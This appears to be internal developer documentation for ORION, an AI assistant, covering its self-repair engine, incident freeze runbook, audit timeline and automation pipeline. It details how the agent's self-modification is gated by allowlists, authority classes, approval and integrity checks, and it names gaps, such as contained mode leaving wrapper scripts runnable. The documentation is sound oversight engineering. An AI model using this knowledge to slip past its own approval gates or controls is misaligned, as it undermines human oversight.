| `orion-help` | Prints the full usage of one tool from `workspace/tools-detail.json` (written by `orion-selfdoc`) so prompts can carry short descriptions |
| `orion-show` | Opens `orion://show/<tab>` to bring a Mac app tab forward; tabs: home, tasks, plan, calendar, projects, health, finances, brand, settings |
| `scripts/lib/orion-integrity.mjs` | `record(name, root)` and `verify(name, root)` over a file manifest at `~/.openclaw/orion-gate/integrity` (`ORION_GATE_DIR`); launchd starts this verifier in place of the bridge |
| `scripts/lib/orion-reauth.mjs` | `reauthenticate(reason, {timeoutMs=120000})`: loosening the guard needs the Mac owner present; tests set a stand-in authenticator |
| `scripts/lib/orion-gate-selftest.mjs` | `runGateSelfTest(dist)` (line 93): exercises the compiled gate |

### Questions to ask your tutor (section 9)
1. Why does `orion-deploy` put the machine-bound suites ahead of install, and why can CI not run them?
2. Why is "home" separate from the machine timezone, and why is `orion-timezone set` a command and not a daemon?
3. Walk through how `orion-backup` gets a passphrase to openssl without it appearing in argv, and what bug that fixed.
4. Which price table would you trust for a dollar figure, and what would you check first?
5. What is the difference between a ceiling in `orion-budget` and a gate in the plugin?

---
## 10. Repair, incidents, and the automation runtime

This chapter covers the scripts that change ORION himself (`orion-repair`, `orion-forge`, `orion-code`, `orion-skill`), the scripts that stop him when something is wrong (`orion-incident`, `orion-incident-timeline`), the scheduled-job runtime (`orion-automation*` plus eleven `scripts/lib/orion-automation-*.mjs` modules), and a set of smaller operational CLIs (approval, sessions, brain, voice, benchmarks, probes). Snapshot: branch `orion-v2/backlog-checkpoint`, HEAD `6c93032`, 2026-10-14, dirty worktree (none of the files in this chapter appear in the uncommitted list at the time of the snapshot, so everything cited here is committed).

Two ideas recur and are worth holding in your head before reading any section:

1. **One file you can read end to end.** `orion-repair`, `orion-forge`, `orion-approve`, `orion-automation` are deliberately *separate programs* rather than branches inside the 10,000-line plugin. The dangerous logic lives where a person can audit it in one sitting. The plugin's job is only to get a request through the approval gate; the script's job is to make the change survivable (build, test, health-check, roll back) or refuse it.
2. **Absent from the exec allowlist = the model cannot run it.** Agent `main` runs with `security: allowlist, ask: off, askFallback: deny` (read from `~/.openclaw/exec-approvals.json`, key `defaults`). A script not on the allowlist is refused outright rather than prompted. This is how `orion-approve`, `orion-automation`, `orion-repair`, `orion-forge`, `orion-incident` are kept as *human* programs. I checked the allowlist on 2026-10-14: of this chapter's scripts only `orion-session`, `orion-mission`, `orion-brain`, `orion-skill`, `orion-shortcut`, `orion-mic-doctor`, `orion-probe-plugin` and `orion-probe-tools` are on it. The plugin reaches the others through typed actions whose executors spawn the script directly (e.g. `runOrionScript("orion-repair", ...)` at `plugin/orion-control/src/executors.ts:3241`), after the approval gate has already run.

Chapter map:

| Section | What |
|---|---|
| 10.1 | `orion-repair` + `orion-repair-classify.mjs`: self-repair of plugin, wrapper scripts and OpenClaw config |
| 10.2 | `orion-incident`: the "freeze everything" button and runbook |
| 10.3 | `orion-incident-timeline`: merged audit-log timeline |
| 10.4 | The automation lifecycle (install, schedule, tick, admission, dispatch, run, history, forecast): `orion-automation`, `orion-automation-run`, and all `lib/orion-automation-*.mjs` |
| 10.5 | Shared libs: `orion-plugin.mjs`, `orion-selfdev-policy.mjs`, `thinking-policy.mjs`, `eval-mode.mjs`, `orion-inference-summary.mjs` |
| 10.6 | `orion-approve` / `orion-approve-resume` |
| 10.7 | `orion-forge` (Swift self-modification), `orion-code` (offline coder) and `orion-agent` (pointers) |
| 10.8 | `orion-session` (focus session client) and `orion-mission` (autonomous missions) |
| 10.9 | The `orion-brain*` family and brief rows: reset-session, computer, skill, shortcut, interface |
| 10.10 | Brief rows: voice and macOS setup (sign-setup, mic-doctor, enroll-voice, voiceid-install, tts-install, local-tts) |
| 10.11 | Brief rows: benchmarks and probes |

---

### 10.1 `orion-repair` and `orion-repair-classify.mjs`

- **What it is** — A zsh script (802 lines, `scripts/orion-repair`) that lets ORION repair "the three things that actually break underneath" his Swift app: the **plugin** (`plugin/orion-control/src/*.ts`), the **wrapper scripts** (`scripts/orion-*`), and the **OpenClaw config** (`~/.openclaw/openclaw.json`). The header (`scripts/orion-repair:3-15`) tells the origin story: `orion-forge` already let him rewrite his own UI, but asked to fix a misconfiguration he answered, correctly, that he could not. "That was a missing capability wearing the costume of a safety property." The companion `scripts/lib/orion-repair-classify.mjs` (169 lines) is a thin Node program that loads the *compiled* plugin policy (`selfrepair.js`) and prints decisions as JSON, so the zsh script never restates any policy.
- **Where**
  - Header, the rule and the four gates: `scripts/orion-repair:17-76`
  - Repo/state-dir coupling guard: `scripts/orion-repair:83-124`
  - Ledger, audit and status writers: `scripts/orion-repair:136-186`
  - Gate 1 (class): `resolve_policy` 196-204, `classify` 206-216, `require_class` 224-257, `resolve_in` 267-287
  - Gate 4 helpers (health, restart, restore): `health_ok` 295-303, `restart_gateway` 305-311, `wait_healthy` 313-321, `restore_verified` 328-340, `backup_installed_dist` 342-351, `deploy_dist` 353-358, `record_integrity` 370-373
  - Plugin subcommands: `cmd_plugin_list/read/modify` 377-523, `cmd_watch_deploy` 527-548, `cmd_plugin_revert` 550-577, `cmd_plugin_status` 579-592
  - Script subcommands: `smoke_script` 615-636, `cmd_script_modify` 638-684, `cmd_script_revert` 686-695
  - Config subcommands: `cmd_config_modify` 704-766, `cmd_config_revert` 768-782
  - Dispatcher: `scripts/orion-repair:784-802`
  - Compiled policy source of truth: `plugin/orion-control/src/selfrepair.ts` (tables at lines 51, 120, 224, 284, 340-383; classifiers at 436-509)
- **How it works**

**The rule.** `scripts/orion-repair:17-21`: "Orion may widen what he is allowed to do, but only when Nick asked for it by name." Not a denylist ("a denylist has to predict every route to authority and is wrong the first time somebody adds one"). Every target is sorted into one of three classes by tables in `selfrepair.ts`:

| Class | Meaning | Gate |
|---|---|---|
| OPERATIONAL | changes how well he does what he already does (voice timing, model, a log writer) | build, test, install, prove, roll back |
| AUTHORITY | changes what he is *allowed* to do, or the code that decides that (capability flags, exec policy, enforcement source files) | everything above, plus the caller must pass `--authority`, plus an audit line with the authorising instruction |
| FORBIDDEN | credentials, gateway networking, the audit paths, this script | refused with a sentence naming what a human has to do |

A target matching no table is refused: "the tables below are allowlists" (`selfrepair.ts` header).

**The four gates** (`scripts/orion-repair:38-58`):

1. **CLASS.** The target must be in a table. Names are resolved by realpath *and* by on-disk name, so `../`, absolute paths, symlinks and case-folded spellings die before anything opens. `resolve_in` (267-287) does three separate checks because each catches something the others miss: a shape check (`""|.|..|*/*|*\\*|.*` rejected), a `realpath` comparison (`${real:h}` must equal the root), and a Python `os.listdir` membership test (kills case-folded spellings on a case-insensitive APFS volume).
2. **BUILD.** `tsc -p tsconfig.json` must succeed, then `vitest run --config ./vitest.config.ts` must pass the whole suite. Failure restores the source from backup and rebuilds (lines 434-457).
3. **PROOF.** If `needs-selftest <file>` exits 0 (i.e. the file is in `ENFORCEMENT_PLUGIN_FILES`: `approvals.ts, catalog.ts, controller.ts, index.ts, permissions.ts, provenance.ts, selfrepair.ts, strictness.ts, transcript.ts, validator.ts`, `selfrepair.ts:340-351`), the freshly built dist is run through `scripts/lib/orion-gate-selftest.mjs`: "a forged anchor, an absent anchor, generic assent and a tainted target must all still be refused by the javascript that was just built" (header 46-53). Rationale: a capability grant is scoped and reversible; an edit that removes the requirement to *ask* removes it for every future change including the next one.
4. **HEALTH.** Install the dist, restart the gateway, require it to answer. "Two questions, not one" (comment at 289-294): `curl http://127.0.0.1:18789/health` must contain `"ok":true` **and** `openclaw plugins inspect orion-control` must print `Status: loaded` (lines 295-303). A plugin that throws on load leaves a healthy gateway with none of Orion's tools, which looks fine from outside and is total from Orion's side. The previous dist is restored if either fails.

**Class enforcement in both directions** (`require_class`, 224-257):

```zsh
# scripts/orion-repair:233-249
    authority)
      if (( ! authority )); then
        log "refused: '$target' decides what Orion is allowed to do."
        log "         That is allowed, but not silently. Ask for it by name — say what"
        ...
        ledger refused "authority target without approval gate" "$surface" "$target"
        return 1
      fi
      ;;
    operational)
      if (( authority )); then
        log "refused: '$target' is ordinary behaviour, not an authority change."
```

An authority target without `--authority` is "the attack" (it would mean the approval gate was skipped). An operational target *with* `--authority` is also refused, so the plugin and the script each decide the class independently and a bug in one cannot slip a change through (`executors.ts:3155-3180` says the same from the plugin side).

**plugin-modify walk-through** (`scripts/orion-repair:392-523`):

1. Parse flags `--authority`, `--detach-restart`, `--instruction <file>` (396-403).
2. `require_class plugin <file> <authority>`, then `resolve_in "$SRC" "$file"` (407-409).
3. Stage the edit through `scripts/orion_forge_edit.py <target> <findfile> <replacefile> <staged>` (416). That Python helper applies an exact find/replace and refuses an ambiguous (multi-match) find string, "because resolving ambiguity is how an edit lands somewhere nobody meant" (comment 411-413). Same helper `orion-forge edit` uses.
4. Back up to `$BACKUPS/src.<file>.previous` and record what it is a backup *of* in `<backup>.target` (422-427). `revert` refuses a backup whose recorded target differs from the file it would overwrite (`restore_verified`, 328-340).
5. Build, test, (if enforcement file) gate self-test (433-476). Every failure path runs `$undo` (a `cp` of the backup), rebuilds, writes a ledger row `rejected`, and for authority changes an audit row `gate_selftest_failed`.
6. `backup_installed_dist` copies the installed dist to `$BACKUPS/dist.previous` *only if* `orion-integrity.mjs verify` says the installed copy is as installed (lines 342-351): only a copy "as it was installed may become the thing a failed repair restores".
7. `deploy_dist`: `rm -rf` installed dist, `cp -R` repo dist, then `record_integrity` re-records the integrity manifest the plugin checks at load. Comment 367-369: this engine and `orion-deploy` are "the two sanctioned writers of the installed plugin".
8. If `--detach-restart` (the plugin **always** passes it): write status `restarting`, ledger `deployed`, then hand the rest to a launchd job:

```zsh
# scripts/orion-repair:491-493
    launchctl submit -l "com.nickmadaio.orion.repairwatch" \
      -o /tmp/orion-repairwatch.log -e /tmp/orion-repairwatch.log \
      -- "$SCRIPTS/orion-repair" __watch-deploy "$target" "$backup" "$file" 2>/dev/null
```

   Why: "The gateway is the process that asked for this, so waiting for it to restart here would mean waiting to be killed" (485-488). The hidden `__watch-deploy` subcommand (`cmd_watch_deploy`, 527-548) restarts the gateway, waits up to 120 s (`wait_healthy 120`), and on failure restores the previous dist, copies the source backup back, rebuilds, restarts again, and writes `healthy` / `rolled_back` / `broken` to the status file. It removes its own launchd job (`launchctl remove com.nickmadaio.orion.repairwatch`) at the end.
9. Without `--detach-restart` the script restarts and waits itself (90 s, 499-523).

**script-modify** (638-684) has no build: "it must compile" becomes "it must parse and it must still answer" (`smoke_script`, 615-636). The first line's interpreter picks the checker (`zsh -n`, `bash -n`, `node --check`, `python3 -m py_compile`). If the script advertises a `status)`, `--help)` or `-h)` case it is run with `status` under a 20 s timeout. Failure restores the previous copy with `cat "$backup" > "$target"` (not `cp`) to preserve the executable mode.

**config-modify** (704-766): classify; `validate-config` (value must be valid JSON and inside the setting's allowed `values`/`min`/`max`, from `OPERATIONAL_CONFIG`) because "the schema does not know that a two-second endpointing delay makes Orion unusable" (comment 720-722); back up `openclaw.json` twice (`openclaw.json.previous` and a timestamped copy); run `openclaw config set <key> <value> --strict-json`; run `openclaw config validate`; roll back on either failure. `--detach-restart` is accepted and ignored (711): "Some settings only take effect when the gateway next restarts" (line 764).

**The classifier program** (`scripts/lib/orion-repair-classify.mjs`). Four subcommands, argv `<dist-dir> <command> ...`:

```js
// scripts/lib/orion-repair-classify.mjs:42-50
let policy;
try {
  policy = await import(pathToFileURL(join(dist, "selfrepair.js")).href);
} catch (error) {
  // Fail closed and loudly. A policy module that will not load is not a reason
  // to proceed without one.
  console.error(`cannot load the repair policy from ${dist}: ${error.message}`);
  process.exit(3);
}
```

`orion-repair` passes the *installed* dist when it exists (`resolve_policy`, 196-204: candidates `$INSTALLED_DIST` then `$PLUGIN/dist`). Why: "checking a proposed edit against the policy it would introduce, rather than the policy it is subject to, is how a change to the class tables would authorise itself" (classifier header 16-21). The comment explains this file exists because `orion-selfdoc` once kept a hand-copied tier table that rotted and ORION told Nick self-modification was off while it was on ("a second source of truth is a lie with a delay fuse", lines 10-14).

- **Contracts**
  - **Subcommands of `orion-repair`** (dispatcher 784-802; default with no args is `plugin-status`):

| Subcommand | Args | Effect |
|---|---|---|
| `plugin-list` | none | prints operational plugin files and authority-bearing ones (marks which need gate self-test); via classifier `list plugin` |
| `plugin-read` | `<file.ts>` | classify (forbidden = refused) then `cat` the source file from `plugin/orion-control/src` |
| `plugin-modify` | `<file.ts> <find-file> <replace-file> [--authority] [--detach-restart] [--instruction <file>]` | full four-gate pipeline above. Exit 2 = refused before touching anything; exit 1 = rejected/rolled back; 0 = applied (or deployed and handed to the watcher) |
| `plugin-revert` | none | restore every `src.*.previous` (verified), rebuild, redeploy, restart, health-check, undo if unhealthy |
| `plugin-status` | none | policy dir, installed dir, gateway health, last status JSON, backup names, last 5 ledger rows |
| `script-list` | none | operational scripts, forbidden scripts with reasons |
| `script-read` | `<name>` | `cat` a wrapper script from `scripts/` (classified first) |
| `script-modify` | `<name> <find-file> <replace-file> [--authority] [--instruction <file>]` | parse and smoke gate, restore on failure |
| `script-revert` | none | restore every `script.*.previous` (verified) |
| `config-list` | none | settings Orion can change on his own with current value and bounds, authority patterns, forbidden patterns; reads `$ORION_REPAIR_CONFIG` or `~/.openclaw/openclaw.json` |
| `config-modify` | `<key> <value-json-file> [--authority] [--detach-restart (ignored)] [--instruction <file>]` | validate range, `openclaw config set --strict-json`, `config validate`, roll back on failure |
| `config-revert` | none | restore `openclaw.json.previous`, validate, undo if invalid |
| `__watch-deploy` | `<target> <backup> <file>` (internal) | the detached watcher launched by `launchctl submit` |

  - **Flags** — `--authority`: the caller's action carries the approval gate (only authority-marked catalog actions pass it, per `executors.ts:3160-3166`). `--detach-restart`: hand restart/health/rollback to a launchd job. `--instruction <file>`: path to a file containing the authenticated user turn, for the audit line; truncated to 4000 characters (`audit_authority`, 156-175). It grants nothing.
  - **Env vars**: `ORION_REPO` (default `$HOME/Desktop/ORION`); `ORION_REPAIR_SELFTEST` (a scratch root: redirects `INSTALLED_ROOT`, `STATE`, and the gate dir; `ORION_REPO` may only differ from the default if this is also set, lines 83-100); `ORION_REPAIR_CONFIG` (default `~/.openclaw/openclaw.json`); `ORION_REPAIR_HEALTH_CMD` and `ORION_REPAIR_RESTART_CMD` (test seams: `eval`ed in place of the real health/restart, lines 296-311).
  - **Files on disk** (`STATE=~/.openclaw/orion-controlled`, lines 113-123): `repair-backups/` (`src.<file>.previous`, `script.<name>.previous`, each with a `.target` sidecar; `dist.previous/`; `openclaw.json.previous`, `openclaw.json.<stamp>`, `openclaw.json.undo`), `repair-ledger.jsonl` (rows `{at, outcome, detail, surface, target}`), `repair-audit.jsonl` (rows `{at, kind:"authority_change", surface, target, outcome, authorisingInstruction}`), `repair-status.json` (`{at, state, detail, target}`; states `restarting|healthy|rolled_back|broken`). Node is picked from `~/.openclaw/tools/node/bin/node`, `/opt/homebrew/bin/node`, `/usr/local/bin/node` (129-132), "the node the gateway itself runs on, so a build here is the build it loads".
  - **Ledger outcome vocabulary**: `refused`, `rejected`, `applied`, `deployed`, `reverted`.
- **Calls out to** — `node scripts/lib/orion-repair-classify.mjs <dist> classify|validate-config|needs-selftest|list`; `python3 scripts/orion_forge_edit.py`; `./node_modules/.bin/tsc -p tsconfig.json`; `./node_modules/.bin/vitest run --config ./vitest.config.ts`; `node scripts/lib/orion-gate-selftest.mjs plugin/orion-control/dist`; `node scripts/lib/orion-integrity.mjs verify|record orion-control <installed-root>`; `~/.openclaw/bin/openclaw daemon restart`, `openclaw plugins inspect orion-control`, `openclaw config set|validate`; `curl http://127.0.0.1:18789/health`; `launchctl submit -l com.nickmadaio.orion.repairwatch` and `launchctl remove`.
- **History** (`git log -- scripts/orion-repair`): `93e9a42` 2026-08-20 checkpoint (first in git; the ledger shows the engine in use from 2026-08-13, so it predates the repo's first push); `ceb6b79` 2026-09-15 moved plugin/workspace folders under `plugin/`; `9855d99` 2026-09-26 "phases 40-52 ... integrity" added `record_integrity`/`orion-integrity.mjs verify` (Phase 48 comment, lines 367-369). The classifier is only in `93e9a42`.
- **Gotchas & lessons**
  - *The poisoned backup.* Comment 83-93: testing pointed `ORION_REPO` at a scratch tree, `revert` did not follow, and 25-byte stubs landed in the REAL backup set as `script.orion-agenda.previous`; a `script-revert` then would have replaced an 8 kB working wrapper with a two-line stub. Hence the pair-or-refuse rule for `ORION_REPO` + `ORION_REPAIR_SELFTEST` (94-100) and the `.target` sidecars.
  - *Why detach the restart:* the gateway is both the caller and the thing being restarted.
  - *Real-world usage is mostly refusals.* The live `repair-ledger.jsonl` (59 rows, 2026-08-13 to 2026-09-02) breaks down as config refused 22, plugin refused 17, script refused 8, config applied 3, config reverted 3, plugin rejected 3, script applied 2, plugin deployed 1. The single audit row is an authority change to a self-tuning capability flag, applied 2026-08-13. (I counted from the file; counts are a snapshot.)
  - *Stale status.* `repair-status.json` last reads `restarting` for `ambient.ts` at 2026-09-02T18:06. A detached deploy whose watcher never wrote a terminal state would leave exactly this; I could not tell from the files whether it healed afterwards **(inferred: the watcher either died with the gateway or the later state was never written)**. Check `plugin-status` and the gateway instead of trusting that file alone.
  - *Doc vs code disagreement.* The `selfrepair.ts` header (`plugin/orion-control/src/selfrepair.ts:41-47`) says the engine's tables are "checked against each other by `orion-repair policy-check`, which the test suite runs". There is **no** `policy-check` case in `scripts/orion-repair` (dispatcher 784-802). The engine in fact holds no copy at all and reads the compiled tables, which is the stronger design; trust the code.
  - *Self-protection.* `orion-repair`, `orion-forge`, `orion-approve`, `orion-mode`, `orion-automation` are in `FORBIDDEN_SCRIPTS` (`selfrepair.ts:376-399`): "the thing that vouches for a change cannot vouch for a change to itself". `orion-incident` is not in that list; it is simply off the exec allowlist **(inferred: so any repair of it falls into "any other orion-* wrapper is authority-bearing", per classifier `list script` output text)**.
  - Scripts classified OPERATIONAL (`selfrepair.ts:354-367`): `orion-agenda, orion-bench, orion-daily, orion-focus, orion-learn, orion-mic-doctor, orion-mission, orion-recall, orion-session, orion-standing, orion-trace, orion-weather-alert`.
- **Walk it yourself**
  1. `sed -n 17,76p scripts/orion-repair` — read the rule and four gates as prose.
  2. `sed -n 224,257p scripts/orion-repair` — the two-direction class check.
  3. `node scripts/lib/orion-repair-classify.mjs plugin/orion-control/dist list plugin` — read-only; prints the operational and authority file lists from the built policy.
  4. `node scripts/lib/orion-repair-classify.mjs plugin/orion-control/dist classify script orion-approve` — expect a forbidden decision with a reason.
  5. `wc -l ~/.openclaw/orion-controlled/repair-ledger.jsonl` and `tail -3` of it — see real refusals.
- **Questions to ask your tutor**
  1. Why does `orion-repair` read the class tables from the *installed* plugin rather than the repo build? What attack does that prevent?
  2. Walk through what happens, step by step, if a plugin edit compiles and passes tests but the gateway never comes back healthy.
  3. Why is `--detach-restart` always passed by the plugin, and what would deadlock without it?
  4. What is the difference between ledger and audit files, and why are there two?
  5. Why does `script-modify` use `cat "$backup" > "$target"` instead of `cp`?
  6. Why can't `orion-repair` edit itself, and who is allowed to?

---

### 10.2 `orion-incident`

- **What it is** — A bash script (267 lines, `scripts/orion-incident`) from Phase 74: "the things you do when something has gone wrong, in one place". Every mechanism already existed (`orion-lock`, `orion-mode contained`, `orion-remote-install --remove`, `orion-automation remove`); what did not exist was the ability to do all of them **at once**, in the right order, by someone who is shaken at 3am (header 5-15). It is a human program, not on the exec allowlist.
- **Where** — Header and rationale `scripts/orion-incident:3-35`; runbook text `runbook_all` 44-104; `runbook` subcommand 108-119; `status` 121-142; `thaw` 144-180; usage/dispatch 182-184; `freeze` body 186-267.
- **How it works**
  - **Order is deliberate: loudest first** (17-22). 1) remote access (the Discord bridge: the only route in from outside this Mac), 2) automation (a scheduled job fires whether anyone is watching), 3) strictness mode, 4) the permission floor. "If this script dies halfway through, the half that ran is the half that mattered."
  - `freeze` (186-267):
    1. If `pgrep -f 'orion-remote/scripts/orion-remote-bridge run'` finds the bridge, run `scripts/orion-remote-install --remove`; record "remote access disabled" (192-202).
    2. For every file in `~/.openclaw/orion-controlled/automations/installed/*.json`, run `orion-automation remove <name>`; count successes (204-211). It prints (but does not touch) the three older cron jobs: focus guard, standing orders, memory rollup (212-215) because stopping them "is a judgement call about whether the incident involves them".
    3. `scripts/orion-mode contained` (218). Always recorded in the actions list.
    4. Step 4 is *explanation only*. It does not run `orion-lock`. It prints what `contained` does and does not cover and tells Nick to run `./scripts/orion-lock` himself if the incident warrants the floor (`restricted_read_only` profile and stopping the channel). Reason (222-244): `contained` gates the plugin's typed actions (a fix that only landed on 2026-09-04 after an "oblivious review" found the mode was computed for a status readout and never reached the validator), but "it does NOT touch the exec allowlist, so the orion-* wrapper scripts still run". Only `orion-lock` reaches the floor, and "it is the one step that should need a person to mean it".
    5. Step 5 prints the rotations only Nick can do, each with the exact issuer URL (Google permissions page, Discord developer portal "Reset Token", Anthropic console keys, and a Keychain `security delete-generic-password -s orion-backup` instruction). Reason (24-30): a script that clicked through an OAuth revocation "would be a script holding Nick's Google session — the thing this whole system is built not to be".
    6. Writes `~/.openclaw/orion-controlled/incident.json` `{frozenAt, actions[]}` via an inline Python heredoc (254-261).
  - `thaw` (144-180) is **not** the inverse of freeze: it only lifts containment. It runs `orion-mode guarded --yes` (`--yes` is required because contained to guarded is a relaxation) and then *checks* by calling `orion-mode --json` and comparing `mode == guarded` before deleting `incident.json`. History: the first version omitted `--yes`, "so thaw printed 'Lifting containment only', orion-mode refused, and Orion stayed contained — a script reporting success while doing nothing". Now if the mode is still not `guarded` it keeps the incident record and exits 1 (164-172). It prints what stays off on purpose: remote bridge (`./scripts/orion-remote-install`), automations (`orion-automation install <name>`, which is currently disabled; see 10.4), and the permission profile (`orion-permissions`; Nick raises it himself).
  - `status` (121-142) shows freeze state, whether the bridge is running, the strictness mode (`orion-mode --json`), the permission profile from `permission-state.json`, and a count of `orion-` jobs from `openclaw cron list`.
  - `runbook [kind]` (108-119, 44-104) prints seven procedures: BACKEND COMPROMISE and DATABASE LEAK (both "there is no backend/database" with the equivalent risk named), OAUTH CREDENTIAL LEAK, DEVICE THEFT, MALICIOUS DEPENDENCY, PRODUCTION SECRET LEAK, UNAUTHORIZED AUTOMATION. `kind` is upper-cased and matched as a prefix by an `awk` filter.
- **Contracts**
  - `orion-incident [freeze | status | thaw | runbook [kind]]`; default with no argument is `status`; unknown argument prints usage and exits 64.
  - State file: `~/.openclaw/orion-controlled/incident.json` (absent at the 2026-10-14 snapshot, i.e. no freeze in effect).
  - No flags or env vars. Exit codes: 0 normal, 1 if thaw did not take, 64 usage.
- **Calls out to** — `scripts/orion-remote-install --remove`, `scripts/orion-automation remove <name>`, `scripts/orion-mode contained | guarded --yes | --json`, `~/.openclaw/bin/openclaw cron list`, `pgrep`, Python for JSON.
- **History** — `4b8915b` 2026-09-04 "phases 71-80" created it; `f8f69d2` 2026-09-04 "the ladder was a description, and the backup held a live token" (the review fix that made `contained` actually reach the validator and removed an overclaim); `8cc9cbe`/`ceb6b79` 2026-09-15 path moves.
- **Gotchas & lessons** — A script that reports success while doing nothing is "the exact failure mode this whole system is built against": hence verify-after-act in `thaw`. Freeze is order-sensitive; do not reorder. Freeze deliberately leaves the permission floor to a human. The runbook's UNAUTHORIZED AUTOMATION text says an automation "cannot install itself" (Phase 57) — true today in a stronger sense, since install is disabled entirely.
- **Walk it yourself** — `./scripts/orion-incident status` (read-only: it only reads and calls `orion-mode --json`/`openclaw cron list`); `./scripts/orion-incident runbook device` (prints one procedure); `sed -n 186,267p scripts/orion-incident`. Do **not** run `freeze` or `thaw` casually: they change real state.
- **Questions to ask your tutor** — (1) Why is `orion-lock` printed instead of run? (2) What was the bug in the first `thaw`, and what check was added? (3) What can `contained` not stop, and why does that matter in a compromise? (4) Why does freeze name but not stop the three older cron jobs? (5) Why does the script refuse to revoke Google tokens itself?

---

### 10.3 `orion-incident-timeline` and `orion-incident-timeline.mjs`

- **What it is** — A read-only Node CLI (117 lines, `scripts/orion-incident-timeline`) over a pure library (112 lines, `scripts/lib/orion-incident-timeline.mjs`) that merges four audit logs into one chronological story. Added 2026-09-27 by an automated local-model task (commit subjects `agent(ops-incident-timeline)` and `agent(ops-incident-cli)`; the later `2f89313` 2026-10-07 only touched it incidentally in an unrelated schedule fix).
- **Where** — CLI: arg parsing 11-51, JSONL reader 53-70, `main` 72-114. Library: `buildIncidentTimeline` 9-95, `parseMs` 101-112.
- **How it works** — The CLI reads four files from the log directory (default `~/.openclaw/orion-controlled`): `permission-audit.jsonl`, `remote-audit.jsonl`, `repair-audit.jsonl`, `location-audit.jsonl` (lines 78-81). A line that fails `JSON.parse` becomes a `{__bad__:true}` sentinel, which the library counts as "skipped" because `parseMs` of its missing timestamp returns null. The library maps each row to `{at, iso, source, summary, severity}`:

| Source | Timestamp field | Summary | Severity |
|---|---|---|---|
| permission | `changedAt` | `permission <prev.profile> -> <next.profile>` | high |
| remote | `at` | `<decision> <verb>: <first 80 chars of text>` | medium if decision is `refused`/`rejected`/`error`, else low |
| repair | `at` | `<kind> <surface> <target> -> <outcome>` | high |
| location | `at` | `location <action>` | low |

  Rows before the `since` cutoff are dropped (not counted as skipped). Output is sorted by time, then source, then summary. Default window: last 7 days (`Date.now() - 7*24*60*60*1000`, line 84).
- **Contracts** — Flags (all in `parseArgs`, 11-51; an unknown flag prints `Unknown flag: ...` and exits 2):

| Flag | Value | Default | Effect |
|---|---|---|---|
| `--dir` | path | `~/.openclaw/orion-controlled` | where to find the four JSONL files |
| `--since` | any `Date`-parseable string | 7 days ago | earliest event to include; bad date exits 2 |
| `--severity` | `low` / `medium` / `high` | none | keep events at or above this level (order low 0, medium 1, high 2); bad value exits 2 |
| `--json` | boolean | off | emit `{events, skipped}` as JSON instead of text lines |

  Text format: `<ISO>  <severity padded 6> <source padded 10> <summary>`; prints "Nothing recorded in that window." when empty, and `(N unreadable line(s) skipped)` when any were skipped. No writes anywhere.
- **Calls out to** — nothing; `fs` reads only.
- **Gotchas** — Note a subtle mismatch **(inferred from reading both)**: `orion-repair` writes `{kind:"authority_change", surface, target, outcome}` rows to `repair-audit.jsonl`, which matches the timeline's repair mapping. But the *repair ledger* (`repair-ledger.jsonl`, which has the refusals and rollbacks) is **not** read, so refused repairs do not appear in the timeline; only authority changes do. Also remote rows with an unfamiliar `decision` value land as low severity.
- **Walk it yourself** — `node scripts/orion-incident-timeline --since 2026-09-01 --severity medium` (read-only), then add `--json | head`. Tests: `tests/ops-incident-timeline.test.mjs`, `tests/ops-incident-cli.test.mjs`.
- **Questions to ask your tutor** — (1) Why mark permission and repair events high but remote and location low? (2) Why is the library pure and the CLI doing the file reading? (3) What does "skipped" count, and what does it not count? (4) Which log would you add to see refused repairs?

---

### 10.4 The automation lifecycle: `orion-automation`, `orion-automation-run`, and `lib/orion-automation-*.mjs`

- **What it is** — The machinery behind Phase 57 ("Model may propose automation. Model may not silently install permanent automation.", `scripts/orion-automation:7-10`) and Phase 58 (simulate with history). ORION (the model) can *propose* a scheduled job through plugin actions `automation_propose`, `automation_list`, `automation_simulate`, `automation_withdraw`; there is **no install action in the plugin**. Installing is Nick's act, and it lives in this CLI. The runtime that eventually fires an installed job is a set of small, defensive modules with durable ledgers. **Important status at the snapshot:** the human `install` command is deliberately disabled ("installation is unavailable until guarded scheduler registration is connected", `scripts/orion-automation:178-182`); an installation *transaction library* exists (`orion-automation-install.mjs`) and is covered by tests but is **not called by any CLI** (grep of `scripts`, `plugin/orion-control/src` finds callers only in `tests/automation-install.test.mjs`). `~/.openclaw/orion-controlled/automations/` contains only an empty `proposed/` directory (created 2026-09-03). So today nothing is installed and nothing is scheduled; the whole pipeline below is built, tested, and waiting for a human-only registration step. `HANDOFF.md` (lines ~1691-1818) records the build order, and `docs/planning/v2/PHASE_57_SCHEDULE_2026-09-21.md` states the "Next gate": "human-only registration that creates installation identity and durable state, creates a disabled job, verifies its exact configuration and enables it only after those steps succeed".
- **Where** (all under `scripts/` unless noted)

| File | Lines | Role |
|---|---|---|
| `orion-automation` | 207 | human CLI: list, show, simulate, schedule-plan, install (disabled), remove |
| `orion-automation-run` | 6 | the scheduler's one entry point |
| `lib/orion-automation-tick.mjs` | 21 | validate argv, floor the clock to the minute, call the runtime, sanitise the result |
| `lib/orion-automation-runtime.mjs` | 91 | load installed record, build adapters, call dispatch, append history |
| `lib/orion-automation-host.mjs` | 84 | read live authority/mode/focus; authorize the one supported action |
| `lib/orion-automation-dispatch.mjs` | 174 | the durable state machine: slot check, lock, retry policy, delivery |
| `lib/orion-automation-admission.mjs` | 153 | conditions (expiry, mode, quiet hours, focus) and durable daily-run/message quotas |
| `lib/orion-automation-schedule.mjs` | 41 | pure preview: cron expression, argv, scheduler args |
| `lib/orion-automation-install.mjs` | 511 | durable disabled-install transaction and reconcile (library only) |
| `lib/orion-automation-removal.mjs` | 30 | verify-then-remove a scheduler job |
| `lib/orion-automation-history.mjs` | 98 | append-only per-automation history ledger |
| `lib/orion-automation-history-summary.mjs` | 88 | pure summary over a window |
| `lib/orion-automation-history-forecast.mjs` | 52 | merge a summary into a `simulate()` forecast |
| `plugin/orion-control/src/automation.ts` | n/a | the closed action table, `validateProposal`, `cronExpression`, `simulate` (imported through the compiled dist) |

#### The end-to-end lifecycle

```
propose      (model)  plugin action automation_propose  -> automations/proposed/<name>.json
look first   (human)  orion-automation simulate <name>   (forecast + observed history)
preview      (human)  orion-automation schedule-plan <name> --timezone <IANA>
install      (human)  [disabled today]  would run installDisabledAutomation:
                         lock -> transaction file -> create DISABLED cron job -> read back & verify
                         -> initialize ledgers -> publish installed/<name>.json -> complete
                         -> (future, not built) human enables the job
schedule     (OpenClaw cron)  fires `scripts/orion-automation-run <name>` every matching minute
tick         automationTick: validate name, floor clock to the minute
runtime      runInstalledAutomation: read installed record, build adapters, dispatch
admission    dispatchAutomation -> reserveAutomationRun: conditions + durable daily quota
